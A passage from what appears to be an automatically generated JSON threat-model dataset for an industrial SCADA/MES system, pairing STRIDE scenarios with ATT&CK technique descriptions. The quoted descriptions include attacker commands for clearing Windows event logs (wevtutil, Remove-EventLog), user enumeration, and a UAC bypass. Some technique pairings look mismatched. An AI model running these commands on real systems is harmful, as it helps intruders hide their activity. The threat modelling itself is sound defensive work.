            "mitre_technique": {
                "name": "Clear Windows Event Logs",
                "description": "Adversaries may clear Windows Event Logs to hide the activity of an intrusion. Windows Event Logs are a record of a computer's alerts and notifications. There are three system-defined sources of events: System, Application, and Security, with five event types: Error, Warning, Information, Success Audit, and Failure Audit.\n\n\nWith administrator privileges, the event logs can be cleared with the following utility commands:\n\n* <code>wevtutil cl system</code>\n* <code>wevtutil cl application</code>\n* <code>wevtutil cl security</code>\n\nThese logs may also be cleared through other mechanisms, such as the event viewer GUI or [PowerShell](https://attack.mitre.org/techniques/T1059/001). For example, adversaries may use the PowerShell command <code>Remove-EventLog -LogName Security</code> to delete the Security EventLog and after reboot, disable future logging.  Note: events may still be generated and logged in the .evtx file between the time the command is run and the reboot.(Citation: disable_win_evt_logging)\n\nAdversaries may also attempt to clear logs by directly deleting the stored log files within `C:\\Windows\\System32\\winevt\\logs\\`.",
                "id": "attack-pattern--6495ae23-3ab4-43c5-a94f-5638a2c31fd2",
                "technique_id": "T1070.001"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "Manufacturing personnel deny initiating a modification of production workflow.",
            "Assumptions": [
                {
                    "Assumption": "Changes to workflows are not securely logged with user identity.",
                    "Role": "Workflow Management",
                    "Condition": "True if workflow changes do not have a secure audit trail."
                },
                {
                    "Assumption": "Audit logs do not capture sufficient detail about modifications.",
                    "Role": "Audit Logs",
                    "Condition": "True if logs lack detail about who made changes."
                },
                {
                    "Assumption": "Logs can be tampered with by unauthorized users.",
                    "Role": "Logs",
                    "Condition": "True if logs are not tamper-proof."
                }
            ],
            "Potential Impact": "Operational disruptions and inability to hold responsible parties accountable.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "workflow",
                "logs",
                "accountability"
            ],
            "mitre_technique": {
                "name": "Clear Windows Event Logs",
                "description": "Adversaries may clear Windows Event Logs to hide the activity of an intrusion. Windows Event Logs are a record of a computer's alerts and notifications. There are three system-defined sources of events: System, Application, and Security, with five event types: Error, Warning, Information, Success Audit, and Failure Audit.\n\n\nWith administrator privileges, the event logs can be cleared with the following utility commands:\n\n* <code>wevtutil cl system</code>\n* <code>wevtutil cl application</code>\n* <code>wevtutil cl security</code>\n\nThese logs may also be cleared through other mechanisms, such as the event viewer GUI or [PowerShell](https://attack.mitre.org/techniques/T1059/001). For example, adversaries may use the PowerShell command <code>Remove-EventLog -LogName Security</code> to delete the Security EventLog and after reboot, disable future logging.  Note: events may still be generated and logged in the .evtx file between the time the command is run and the reboot.(Citation: disable_win_evt_logging)\n\nAdversaries may also attempt to clear logs by directly deleting the stored log files within `C:\\Windows\\System32\\winevt\\logs\\`.",
                "id": "attack-pattern--6495ae23-3ab4-43c5-a94f-5638a2c31fd2",
                "technique_id": "T1070.001"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "Denial of sending or receiving critical command by field operators.",
            "Assumptions": [
                {
                    "Assumption": "Command exchanges are not logged with sufficient detail.",
                    "Role": "Command Channel",
                    "Condition": "True if logs do not capture command transactions."
                },
                {
                    "Assumption": "Logs are missing integrity verification.",
                    "Role": "Logs",
                    "Condition": "True if logs can be modified without detection."
                },
                {
                    "Assumption": "Logs are not regularly reviewed or protected.",
                    "Role": "Security Team",
                    "Condition": "True if logs are not periodically reviewed or secured."
                }
            ],
            "Potential Impact": "Challenges in identifying the source of errors or unauthorized activities, affecting system reliability and operator accountability.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "commands",
                "logging",
                "field operators"
            ],
            "mitre_technique": {
                "name": "System Owner/User Discovery",
                "description": "Adversaries may attempt to identify the primary user, currently logged in user, set of users that commonly uses a system, or whether a user is actively using the system. They may do this, for example, by retrieving account usernames or by using [OS Credential Dumping](https://attack.mitre.org/techniques/T1003). The information may be collected in a number of different ways using other Discovery techniques, because user and username details are prevalent throughout a system and include running process ownership, file/directory ownership, session information, and system logs. Adversaries may use the information from [System Owner/User Discovery](https://attack.mitre.org/techniques/T1033) during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\n\nVarious utilities and commands may acquire this information, including <code>whoami</code>. In macOS and Linux, the currently logged in user can be identified with <code>w</code> and <code>who</code>. On macOS the <code>dscl . list /Users | grep -v '_'</code> command can also be used to enumerate user accounts. Environment variables, such as <code>%USERNAME%</code> and <code>$USER</code>, may also be used to access this information.\n\nOn network devices, [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) commands such as `show users` and `show ssh` can be used to display users currently logged into the device.(Citation: show_ssh_users_cmd_cisco)(Citation: US-CERT TA18-106A Network Infrastructure Devices 2018)",
                "id": "attack-pattern--03d7999c-1f4c-42cc-8373-e7690d318104",
                "technique_id": "T1033"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Leakage of sensitive operational data stored in the MES database.",
            "Assumptions": [
                {
                    "Assumption": "Database access controls are inadequately configured or enforced.",
                    "Role": "Database",
                    "Condition": "True if access controls do not limit user access effectively."
                },
                {
                    "Assumption": "Data is not encrypted in storage.",
                    "Role": "Data Storage",
                    "Condition": "True if encryption is not used or improperly configured."
                },
                {
                    "Assumption": "User credentials are compromised or weak.",
                    "Role": "User",
                    "Condition": "True if passwords are weak or easily compromised."
                }
            ],
            "Potential Impact": "Exposure of trade secrets, operational strategies, and sensitive business information leading to competitive and financial disadvantages.",
            "MITRE ATT&CK Keywords": [
                "data leakage",
                "database",
                "MES",
                "encryption"
            ],
            "mitre_technique": {
                "name": "Stored Data Manipulation",
                "description": "Adversaries may insert, delete, or manipulate data at rest in order to manipulate external outcomes or hide activity.(Citation: FireEye APT38 Oct 2018)(Citation: DOJ Lazarus Sony 2018) By manipulating stored data, adversaries may attempt to affect a business process, organizational understanding, and decision making. \n\nStored data could include a variety of file formats, such as Office files, databases, stored emails, and custom file formats. The type of modification and the impact it will have depends on the type of data as well as the goals and objectives of the adversary. For complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in order to have the desired impact.",
                "id": "attack-pattern--0bf78622-e8d2-41da-a857-731472d61a92",
                "technique_id": "T1492"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Interception of communication between the SCADA system and cloud services reveals sensitive data.",
            "Assumptions": [
                {
                    "Assumption": "Data in transit is not properly encrypted.",
                    "Role": "Communication Channel",
                    "Condition": "True if encryption protocols are weak or not implemented."
                },
                {
                    "Assumption": "Network traffic is accessible to unauthorized entities.",
                    "Role": "Network",
                    "Condition": "True if the network lacks adequate segmentation and protection."
                },
                {
                    "Assumption": "Security policies are not effectively enforced.",
                    "Role": "Security Policies",
                    "Condition": "True if policies are outdated or not followed rigorously."
                }
            ],
            "Potential Impact": "Unauthorized access to sensitive operational data and possible exploitation for industrial espionage.",
            "MITRE ATT&CK Keywords": [
                "data interception",
                "SCADA",
                "cloud communication",
                "encryption"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Unauthorized access to real-time data streams managed by the cloud services.",
            "Assumptions": [
                {
                    "Assumption": "Access controls for cloud services are improperly configured.",
                    "Role": "Cloud Services",
                    "Condition": "True if access controls are weak or misconfigured."
                },
                {
                    "Assumption": "Data streams are not encrypted or monitored.",
                    "Role": "Data Stream",
                    "Condition": "True if encryption is not applied or monitoring is lacking."
                },
                {
                    "Assumption": "Administrative credentials are compromised.",
                    "Role": "Administrator",
                    "Condition": "True if credentials are phished or otherwise compromised."
                }
            ],
            "Potential Impact": "Real-time operational visibility is compromised, potentially leading to competitive disadvantages and operational risks.",
            "MITRE ATT&CK Keywords": [
                "real-time data",
                "cloud services",
                "unauthorized access",
                "encryption"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--35aa9608-bc4b-4ff0-aa71-cf92ed0ff6e0",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "DDoS attack targets the Control Center, rendering it unable to issue commands to RTUs.",
            "Assumptions": [
                {
                    "Assumption": "Control Center is directly accessible from the internet without adequate protection.",
                    "Role": "Control Center",
                    "Condition": "True if the Control Center lacks DDoS protection."
                },
                {
                    "Assumption": "Network lacks sufficient bandwidth or redundancy to handle excess traffic.",
                    "Role": "Network",
                    "Condition": "True if the network infrastructure is not robust enough."
                },
                {
                    "Assumption": "System monitoring and mitigation strategies are not in place.",
                    "Role": "System",
                    "Condition": "True if the system lacks real-time monitoring and response capabilities."
                }
            ],
            "Potential Impact": "Disruption of operational control, leading to potential failure of industrial processes.",
            "MITRE ATT&CK Keywords": [
                "DDoS",
                "Control Center",
                "network",
                "denial of service"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "Malware infection on a field device causes it to block communication with the RTU.",
            "Assumptions": [
                {
                    "Assumption": "Field devices lack comprehensive malware protection and detection.",
                    "Role": "Field Device",
                    "Condition": "True if malware defenses are not implemented."
                },
                {
                    "Assumption": "RTUs do not have failover mechanisms for compromised field devices.",
                    "Role": "RTU",
                    "Condition": "True if the system lacks redundancy and fail-safes."
                },
                {
                    "Assumption": "Malware can propagate through the network.",
                    "Role": "Network",
                    "Condition": "True if network segmentation and isolation are not in place."
                }
            ],
            "Potential Impact": "Communication disruption between field devices and RTUs, potentially halting industrial operations.",
            "MITRE ATT&CK Keywords": [
                "malware",
                "field device",
                "communication block",
                "RTU"
            ],
            "mitre_technique": {
                "name": "Disk Structure Wipe",
                "description": "Adversaries may corrupt or wipe the disk data structures on a hard drive necessary to boot a system; targeting specific critical systems or in large numbers in a network to interrupt availability to system and network resources. \n\nAdversaries may attempt to render the system unable to boot by overwriting critical data located in structures such as the master boot record (MBR) or partition table.(Citation: Symantec Shamoon 2012)(Citation: FireEye Shamoon Nov 2016)(Citation: Palo Alto Shamoon Nov 2016)(Citation: Kaspersky StoneDrill 2017)(Citation: Unit 42 Shamoon3 2018) The data contained in disk structures may include the initial executable code for loading an operating system or the location of the file system partitions on disk. If this information is not present, the computer will not be able to load an operating system during the boot process, leaving the computer unavailable. [Disk Structure Wipe](https://attack.mitre.org/techniques/T1561/002) may be performed in isolation, or along with [Disk Content Wipe](https://attack.mitre.org/techniques/T1561/001) if all sectors of a disk are wiped.\n\nOn a network devices, adversaries may reformat the file system using [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) commands such as `format`.(Citation: format_cmd_cisco)\n\nTo maximize impact on the target organization, malware designed for destroying disk structures may have worm-like features to propagate across a network by leveraging other techniques like [Valid Accounts](https://attack.mitre.org/techniques/T1078), [OS Credential Dumping](https://attack.mitre.org/techniques/T1003), and [SMB/Windows Admin Shares](https://attack.mitre.org/techniques/T1021/002).(Citation: Symantec Shamoon 2012)(Citation: FireEye Shamoon Nov 2016)(Citation: Palo Alto Shamoon Nov 2016)(Citation: Kaspersky StoneDrill 2017)",
                "id": "attack-pattern--0af0ca99-357d-4ba1-805f-674fdfb7bef9",
                "technique_id": "T1561.002"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "Exploitation of vulnerabilities in the gateway to disrupt data flow between SCADA and cloud services.",
            "Assumptions": [
                {
                    "Assumption": "Gateway software contains exploitable vulnerabilities.",
                    "Role": "Gateway",
                    "Condition": "True if patches and updates are not applied regularly."
                },
                {
                    "Assumption": "Security monitoring for the gateway is insufficient.",
                    "Role": "Security Monitoring",
                    "Condition": "True if anomalies are not detected timely."
                },
                {
                    "Assumption": "No redundancy or failover mechanisms for the gateway.",
                    "Role": "System",
                    "Condition": "True if single points of failure exist without backup."
                }
            ],
            "Potential Impact": "Disruption of critical data flow and potential system downtime, affecting operational continuity.",
            "MITRE ATT&CK Keywords": [
                "vulnerabilities",
                "gateway",
                "data flow",
                "SCADA"
            ],
            "mitre_technique": {
                "name": "Exploit Public-Facing Application",
                "description": "Adversaries may attempt to exploit a weakness in an Internet-facing host or system to initially access a network. The weakness in the system can be a software bug, a temporary glitch, or a misconfiguration.\n\nExploited applications are often websites/web servers, but can also include databases (like SQL), standard services (like SMB or SSH), network device administration and management protocols (like SNMP and Smart Install), and any other system with Internet accessible open sockets.(Citation: NVD CVE-2016-6662)(Citation: CIS Multiple SMB Vulnerabilities)(Citation: US-CERT TA18-106A Network Infrastructure Devices 2018)(Citation: Cisco Blog Legacy Device Attacks)(Citation: NVD CVE-2014-7169) Depending on the flaw being exploited this may also involve [Exploitation for Defense Evasion](https://attack.mitre.org/techniques/T1211) or [Exploitation for Client Execution](https://attack.mitre.org/techniques/T1203).\n\nIf an application is hosted on cloud-based infrastructure and/or is containerized, then exploiting it may lead to compromise of the underlying instance or container. This can allow an adversary a path to access the cloud or container APIs, exploit container host access via [Escape to Host](https://attack.mitre.org/techniques/T1611), or take advantage of weak identity and access management policies.\n\nAdversaries may also exploit edge network infrastructure and related appliances, specifically targeting devices that do not support robust host-based defenses.(Citation: Mandiant Fortinet Zero Day)(Citation: Wired Russia Cyberwar)\n\nFor websites and databases, the OWASP top 10 and CWE top 25 highlight the most common web-based vulnerabilities.(Citation: OWASP Top 10)(Citation: CWE top 25)",
                "id": "attack-pattern--3f886f2a-874f-4333-b794-aa6075009b1c",
                "technique_id": "T1190"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "Unauthorized user gains administrative privileges on the MES database server.",
            "Assumptions": [
                {
                    "Assumption": "Access controls and user privilege management are weak or misconfigured.",
                    "Role": "Access Control",
                    "Condition": "True if proper roles and permissions are not enforced."
                },
                {
                    "Assumption": "Weak password policies or compromised credentials.",
                    "Role": "User",
                    "Condition": "True if weak passwords or credential leaks occur."
                },
                {
                    "Assumption": "Insufficient monitoring of privileged account activities.",
                    "Role": "Security Monitoring",
                    "Condition": "True if privileged user activities are not logged or reviewed."
                }
            ],
            "Potential Impact": "Unauthorized data access and modification, severely compromising system integrity and confidentiality.",
            "MITRE ATT&CK Keywords": [
                "administrative privileges",
                "MES database",
                "user account",
                "access control"
            ],
            "mitre_technique": {
                "name": "Bypass User Account Control",
                "description": "Adversaries may bypass UAC mechanisms to elevate process privileges on system. Windows User Account Control (UAC) allows a program to elevate its privileges (tracked as integrity levels ranging from low to high) to perform a task under administrator-level permissions, possibly by prompting the user for confirmation. The impact to the user ranges from denying the operation under high enforcement to allowing the user to perform the action if they are in the local administrators group and click through the prompt or allowing them to enter an administrator password to complete the action.(Citation: TechNet How UAC Works)\n\nIf the UAC protection level of a computer is set to anything but the highest level, certain Windows programs can elevate privileges or execute some elevated [Component Object Model](https://attack.mitre.org/techniques/T1559/001) objects without prompting the user through the UAC notification box.(Citation: TechNet Inside UAC)(Citation: MSDN COM Elevation) An example of this is use of [Rundll32](https://attack.mitre.org/techniques/T1218/011) to load a specifically crafted DLL which loads an auto-elevated [Component Object Model](https://attack.mitre.org/techniques/T1559/001) object and performs a file operation in a protected directory which would typically require elevated access. Malicious software may also be injected into a trusted process to gain elevated privileges without prompting a user.(Citation: Davidson Windows)\n\nMany methods have been discovered to bypass UAC. The Github readme page for UACME contains an extensive list of methods(Citation: Github UACMe) that have been discovered and implemented, but may not be a comprehensive list of bypasses. Additional bypass methods are regularly discovered and some used in the wild, such as:\n\n* <code>eventvwr.exe</code> can auto-elevate and execute a specified binary or script.(Citation: enigma0x3 Fileless UAC Bypass)(Citation: Fortinet Fareit)\n\nAnother bypass is possible through some lateral movement techniques if credentials for an account with administrator privileges are known, since UAC is a single system security mechanism, and the privilege or integrity of a process running on one system will be unknown on remote systems and default to high integrity.(Citation: SANS UAC Bypass)",
                "id": "attack-pattern--120d5519-3098-4e1c-9191-2aa61232f073",
                "technique_id": "T1548.002"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "Malicious insider exploits a vulnerability in the Control Center to execute high-privilege commands.",
            "Assumptions": [
                {
                    "Assumption": "Control Center software has exploitable vulnerabilities.",
                    "Role": "Control Center",
                    "Condition": "True if vulnerabilities are unpatched or unknown."
                },
                {
                    "Assumption": "Insufficient access control mechanisms within the Control Center.",
                    "Role": "Access Control",
                    "Condition": "True if privilege levels and access are not well-separated."
                },
                {
                    "Assumption": "Security policies for insider threats are not robust.",
                    "Role": "Security Policies",
                    "Condition": "True if there are no or weak insider threat management practices."
                }
            ],
            "Potential Impact": "Execution of unauthorized high-privilege commands, potentially leading to severe operational disruptions or damage.",
            "MITRE ATT&CK Keywords": [
                "insider threat",
                "Control Center",
                "high-privilege",
                "vulnerability"
            ],
            "mitre_technique": {
                "name": "Exploitation for Privilege Escalation",
                "description": "Adversaries may exploit software vulnerabilities in an attempt to elevate privileges. Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code. Security constructs such as permission levels will often hinder access to information and use of certain techniques, so adversaries will likely need to perform privilege escalation to include use of software exploitation to circumvent those restrictions. (Citation: The MITRE Corporation) \n\nWhen initially gaining access to a system, an adversary may be operating within a lower privileged process which will prevent them from accessing certain resources on the system. Vulnerabilities may exist, usually in operating system components and software commonly running at higher permissions, that can be exploited to gain higher levels of access on the system. This could enable someone to move from unprivileged or user level permissions to SYSTEM or root permissions depending on the component that is vulnerable. This may be a necessary step for an adversary compromising an endpoint system that has been properly configured and limits other privilege escalation methods. (Citation: The MITRE Corporation)",
                "id": "attack-pattern--cfe68e93-ce94-4c0f-a57d-3aa72cedd618",
                "technique_id": "T0890"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "Exploit of weak configurations in the gateway to execute privileged operations.",
            "Assumptions": [
                {
                    "Assumption": "Gateway configurations are weak or improperly secured.",
                    "Role": "Gateway",
                    "Condition": "True if default or weak configuration settings are used."
                },
                {
                    "Assumption": "Security monitoring for gateway activities is lacking.",
                    "Role": "Security Monitoring",
                    "Condition": "True if gateway operations are not audited or reviewed."
                },
                {
                    "Assumption": "Attackers have the capability to exploit misconfigurations.",
                    "Role": "Attacker",
                    "Condition": "True if attackers can probe and exploit system configurations."
                }
            ],
            "Potential Impact": "Unauthorized execution of privileged operations, leading to disruption of data flow and potential unauthorized data alterations.",
            "MITRE ATT&CK Keywords": [
                "gateway",
                "privileged operations",
                "configuration exploitation",
                "security monitoring"
            ],
            "mitre_technique": {
                "name": "External Remote Services",
                "description": "Adversaries may leverage external-facing remote services to initially access and/or persist within a network. Remote services such as VPNs, Citrix, and other access mechanisms allow users to connect to internal enterprise network resources from external locations. There are often remote service gateways that manage connections and credential authentication for these services. Services such as [Windows Remote Management](https://attack.mitre.org/techniques/T1021/006) and [VNC](https://attack.mitre.org/techniques/T1021/005) can also be used externally.(Citation: MacOS VNC software for Remote Desktop)\n\nAccess to [Valid Accounts](https://attack.mitre.org/techniques/T1078) to use the service is often a requirement, which could be obtained through credential pharming or by obtaining the credentials from users after compromising the enterprise network.(Citation: Volexity Virtual Private Keylogging) Access to remote services may be used as a redundant or persistent access mechanism during an operation.\n\nAccess may also be gained through an exposed service that doesn\u2019t require authentication. In containerized environments, this may include an exposed Docker API, Kubernetes API server, kubelet, or web application such as the Kubernetes dashboard.(Citation: Trend Micro Exposed Docker Server)(Citation: Unit 42 Hildegard Malware)",
                "id": "attack-pattern--10d51417-ee35-4589-b1ff-b6df1c334e8d",
                "technique_id": "T1133"
            }
        }
    ]
},
{
    "case_number": "4",
    "batch_number": "30",
    "threats": [
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker impersonates a field device to send false data to the Control Center.",
            "Assumptions": [
                {
                    "Assumption": "Field devices can be accessed over the network without strong mutual authentication.",
                    "Role": "Attacker",
                    "Condition": "Attacker has network access to the system"
                },
                {
                    "Assumption": "The system does not verify the identity of devices sending data.",
                    "Role": "System",
                    "Condition": "System lacks robust device authentication mechanisms"
                },
                {
                    "Assumption": "Field devices can communicate with the Control Center over potentially unprotected networks.",
                    "Role": "Network Administrator",
                    "Condition": "Network lacks adequate encryption and security controls"
                }
            ],
            "Potential Impact": "Unauthorized data manipulation, leading to operational disruptions and potential safety hazards.",
            "MITRE ATT&CK Keywords": [
                "Network",
                "Spoofing",
                "Field Device",
                "Control Center",
                "Data Manipulation"
            ],
            "mitre_technique": {
                "name": "Keylogging",
                "description": "Adversaries may log user keystrokes to intercept credentials as the user types them. Keylogging is likely to be used to acquire credentials for new access opportunities when [OS Credential Dumping](https://attack.mitre.org/techniques/T1003) efforts are not effective, and may require an adversary to intercept keystrokes on a system for a substantial period of time before credentials can be successfully captured. In order to increase the likelihood of capturing credentials quickly, an adversary may also perform actions such as clearing browser cookies to force users to reauthenticate to systems.(Citation: Talos Kimsuky Nov 2021)\n\nKeylogging is the most prevalent type of input capture, with many different ways of intercepting keystrokes.(Citation: Adventures of a Keystroke) Some methods include:\n\n* Hooking API callbacks used for processing keystrokes. Unlike [Credential API Hooking](https://attack.mitre.org/techniques/T1056/004), this focuses solely on API functions intended for processing keystroke data.\n* Reading raw keystroke data from the hardware buffer.\n* Windows Registry modifications.\n* Custom drivers.\n* [Modify System Image](https://attack.mitre.org/techniques/T1601) may provide adversaries with hooks into the operating system of network devices to read raw keystrokes for login sessions.(Citation: Cisco Blog Legacy Device Attacks) ",
                "id": "attack-pattern--09a60ea3-a8d1-4ae5-976e-5783248b72a4",
                "technique_id": "T1056.001"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker uses stolen credentials to access cloud services and modify stored data.",
            "Assumptions": [
                {
                    "Assumption": "Cloud service credentials are stored insecurely or transmitted over an insecure channel.",
                    "Role": "User",
                    "Condition": "Users do not follow security best practices for credential storage"
                },
                {
                    "Assumption": "Inadequate monitoring of login attempts and activity logs in cloud services.",
                    "Role": "Cloud Administrator",
                    "Condition": "Logging and monitoring are not properly configured"
                },
                {
                    "Assumption": "The system relies on static credentials without multi-factor authentication (MFA).",
                    "Role": "System Architect",
                    "Condition": "Lack of MFA implementation"
                }
            ],
            "Potential Impact": "Compromise of sensitive operational data, which could lead to competitive disadvantage and operational inefficiencies.",
            "MITRE ATT&CK Keywords": [
                "Cloud Services",
                "Spoofing",
                "Credentials",
                "Data Modification",
                "Access"
            ],
            "mitre_technique": {
                "name": "Stored Data Manipulation",
                "description": "Adversaries may insert, delete, or manipulate data at rest in order to manipulate external outcomes or hide activity.(Citation: FireEye APT38 Oct 2018)(Citation: DOJ Lazarus Sony 2018) By manipulating stored data, adversaries may attempt to affect a business process, organizational understanding, and decision making. \n\nStored data could include a variety of file formats, such as Office files, databases, stored emails, and custom file formats. The type of modification and the impact it will have depends on the type of data as well as the goals and objectives of the adversary. For complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in order to have the desired impact.",
                "id": "attack-pattern--0bf78622-e8d2-41da-a857-731472d61a92",
                "technique_id": "T1492"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker gains access to the gateway using a forged identity and intercepts data between the SCADA system and the cloud services.",
            "Assumptions": [
                {
                    "Assumption": "The gateway does not perform rigorous identity verification of connecting entities.",
                    "Role": "Gateway Administrator",
                    "Condition": "Weak or missing identity verification mechanisms"
                },
                {
                    "Assumption": "Communication channels between the gateway and cloud services are not fully secured.",
                    "Role": "Network Engineer",
                    "Condition": "Lack of encryption or weak encryption protocols"
                },
                {
                    "Assumption": "The system has no effective anomaly detection for gateway access patterns.",
                    "Role": "Security Team",
                    "Condition": "Anomaly detection systems are under-configured or absent"
                }
            ],
            "Potential Impact": "Unauthorized access to sensitive data streams and potential injection of malicious data, leading to significant disruption and information disclosure.",
            "MITRE ATT&CK Keywords": [
                "Gateway",
                "Spoofing",
                "Interception",
                "Data Streams",
                "Cloud Services"
            ],
            "mitre_technique": {
                "name": "External Remote Services",
                "description": "Adversaries may leverage external-facing remote services to initially access and/or persist within a network. Remote services such as VPNs, Citrix, and other access mechanisms allow users to connect to internal enterprise network resources from external locations. There are often remote service gateways that manage connections and credential authentication for these services. Services such as [Windows Remote Management](https://attack.mitre.org/techniques/T1021/006) and [VNC](https://attack.mitre.org/techniques/T1021/005) can also be used externally.(Citation: MacOS VNC software for Remote Desktop)\n\nAccess to [Valid Accounts](https://attack.mitre.org/techniques/T1078) to use the service is often a requirement, which could be obtained through credential pharming or by obtaining the credentials from users after compromising the enterprise network.(Citation: Volexity Virtual Private Keylogging) Access to remote services may be used as a redundant or persistent access mechanism during an operation.\n\nAccess may also be gained through an exposed service that doesn\u2019t require authentication. In containerized environments, this may include an exposed Docker API, Kubernetes API server, kubelet, or web application such as the Kubernetes dashboard.(Citation: Trend Micro Exposed Docker Server)(Citation: Unit 42 Hildegard Malware)",
                "id": "attack-pattern--10d51417-ee35-4589-b1ff-b6df1c334e8d",
                "technique_id": "T1133"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker gains physical access to a PLC and alters its control logic.",
            "Assumptions": [
                {
                    "Assumption": "Physical security measures around the PLCs are insufficient.",
                    "Role": "Facility Security",
                    "Condition": "Lack of physical security controls"
                },
                {
                    "Assumption": "PLCs do not have tamper-evidence mechanisms or logging.",
                    "Role": "Hardware Engineer",
                    "Condition": "PLCs lack built-in tamper detection"
                },
                {
                    "Assumption": "Attacker knows or can determine the PLC control logic.",
                    "Role": "Attacker",
                    "Condition": "Attacker has technical knowledge or documentation"
                }
            ],
            "Potential Impact": "Tampered control logic can cause unauthorized actions, leading to incorrect operation of industrial processes and potential safety risks.",
            "MITRE ATT&CK Keywords": [
                "PLC",
                "Tampering",
                "Control Logic",
                "Physical Access",
                "Industrial Processes"
            ],
            "mitre_technique": {
                "name": "Modify Control Logic",
                "description": "Adversaries may place malicious code in a system, which can cause the system to malfunction by modifying its control logic. Control system devices use programming languages (e.g. relay ladder logic) to control physical processes by affecting actuators, which cause machines to operate, based on environment sensor readings. These devices often include the ability to perform remote control logic updates. \n\nProgram code is normally edited in a vendor-specific Integrated Development Environment (IDE) that relies on proprietary tools and features. These IDEs allow an engineer to perform host target development and may have the ability to run the code on the machine it is programmed for. The IDE will transmit the control logic to the testing device, and will perform the required device-specific functions to apply the changes and make them active.\n\nAn adversary may attempt to use this host target IDE to modify device control logic. Even though proprietary tools are often used to edit and update control logic, the process can usually be reverse-engineered and reproduced with open-source tools.\n\nAn adversary can de-calibrate a sensor by removing functions in control logic that account for sensor error. This can be used to change a control process without actually spoofing command messages to a controller or device. \n\nIt is believed this process happened in the lesser known over-pressurizer attacks build into Stuxnet. Pressure sensors are not perfect at translating pressure into an analog output signal, but their errors can be corrected by calibration. The pressure controller can be told what the \u201creal\u201d pressure is for given analog signals and then automatically linearize the measurement to what would be the \u201creal\u201d pressure. If the linearization is overwritten by malicious code on the S7-417 controller, analog pressure readings will be \u201ccorrected\u201d during the attack by the pressure controller, which then interprets all analog pressure readings as perfectly normal pressure no matter how high or low their analog values are. The pressure controller then acts accordingly by never opening the stage exhaust valves. In the meantime, actual pressure keeps rising. (Citation: Stuxnet - Langner - 201311)\n\nIn the Maroochy Attack, Vitek 